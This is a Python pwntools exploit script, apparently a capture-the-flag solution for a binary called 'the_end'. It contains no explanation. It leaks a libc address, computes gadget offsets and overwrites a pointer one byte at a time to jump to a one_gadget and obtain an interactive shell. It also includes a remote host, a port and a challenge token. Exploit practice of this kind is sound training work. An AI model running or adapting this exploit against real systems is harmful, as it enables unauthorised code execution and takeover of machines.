from pwn import *

def pwn():
    BIN_PATH = './the_end'
    DEBUG = 1
    local = 1
    if DEBUG == 1:
        if local == 1:
            p = process(BIN_PATH)
        else:
            p = process(BIN_PATH, env={'LD_PRELOAD': './libc.so.6'})
        elf = ELF(BIN_PATH)
        context.log_level = 'debug'
        context.terminal = ['tmux', 'split', '-h']
        if context.arch == 'amd64':
            if local == 1:
                libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
            else:
                libc = ELF('./libc.so.6')
        else:
            libc = ELF('/lib/i386-linux-gnu/libc.so.6')
    else:
        p = remote('150.109.44.250', 20002)
        p.recvuntil('Input your token:')
        p.sendline('8RMQq9PuDRurd91OVhADpDDK30eqjAqz')
        elf = ELF(BIN_PATH)
        libc = ELF('./libc.so.6')
        context.log_level = 'debug'

    if DEBUG == 1:
        gdb.attach(p, gdbscript='b *0x0000555555554964')

    p.recvuntil('here is a gift ')
    recv = p.recvuntil(',', drop=True)
    libc.address = int(recv, 16) - libc.symbols['sleep']
    print hex(libc.address)
    one_gadget = [0x45216, 0x4526a, 0xf02a4, 0xf1147]
    p.recvuntil('luck ;)\n')
    p.send(p64(libc.address + (0x7ffff7ffdf48 - 0x00007ffff7a0d000)))
    p.send(p64(libc.address + one_gadget[2])[0])
    p.send(p64(libc.address + (0x7ffff7ffdf48 - 0x00007ffff7a0d000) + 1))
    p.send(p64(libc.address + one_gadget[2])[1])
    p.send(p64(libc.address + (0x7ffff7ffdf48 - 0x00007ffff7a0d000) + 2))
    p.send(p64(libc.address + one_gadget[2])[2])
    p.send(p64(libc.address + (0x7ffff7ffdf48 - 0x00007ffff7a0d000) + 3))
    p.send(p64(libc.address + one_gadget[2])[3])
    p.send(p64(libc.address + (0x7ffff7ffdf48 - 0x00007ffff7a0d000) + 4))
    p.send(p64(libc.address + one_gadget[2])[4])
    # exec /bin/sh 1>&0
    p.interactive()
    p.close()


if __name__ == '__main__':
    pwn()